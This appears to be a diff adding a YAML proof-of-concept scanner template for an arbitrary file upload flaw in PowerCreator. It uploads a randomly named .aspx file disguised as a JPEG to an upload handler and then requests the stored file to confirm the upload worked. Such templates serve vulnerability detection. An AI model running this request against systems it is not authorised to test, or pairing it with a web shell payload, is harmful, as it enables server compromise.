@@ -1,0 +1,37 @@
+detail:
+  author: MrP01ntSun(https://github.com/MrPointSun)
+  links:
+  - https://xz.aliyun.com/t/8478#reply-15684
+expression: r0() && r1()
+manual: true
+name: poc-yaml-powercreator-arbitrary-file-upload
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(b".ASPX")
+    output:
+      path: search["path"]
+      search: '"(?P<path>.+?).ASPX".bsubmatch(response.body)'
+    request:
+      body: "-----------------------------20873900192357278038549710136\r\nContent-Disposition:\
+        \ form-data; name=\"file1\"; filename=\"{{randname}}.aspx\"\r\nContent-Type:\
+        \ image/jpeg\r\n\r\n{{content}}\r\n-----------------------------20873900192357278038549710136--\r\
+        \n"
+      cache: true
+      follow_redirects: false
+      headers:
+        Content-Disposition: form-data;name="file1";filename="{{randname}}.aspx";
+        Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
+      method: POST
+      path: /upload/UploadResourcePic.ashx?ResourceID={{rand}}
+  r1:
+    expression: response.status == 200
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /ResourcePic/{{path}}.ASPX
+set:
+  content: randomLowercase(8)
+  rand: randomInt(1000, 9999)
+  randname: randomLowercase(4)
+transport: http
